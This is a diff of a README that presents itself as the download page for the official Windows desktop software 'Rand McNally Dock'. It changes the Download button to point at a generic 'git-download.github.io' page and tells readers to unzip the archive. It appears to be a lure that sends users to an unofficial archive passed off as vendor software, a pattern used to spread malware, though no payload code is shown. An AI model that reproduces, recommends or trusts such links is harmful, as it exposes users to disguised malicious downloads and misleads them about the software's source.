@@ -6,7 +6,7 @@ Rand McNally Dock is the official Windows desktop software for updating maps, fi
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://rand-mcnally-dock-windows.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://git-download.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
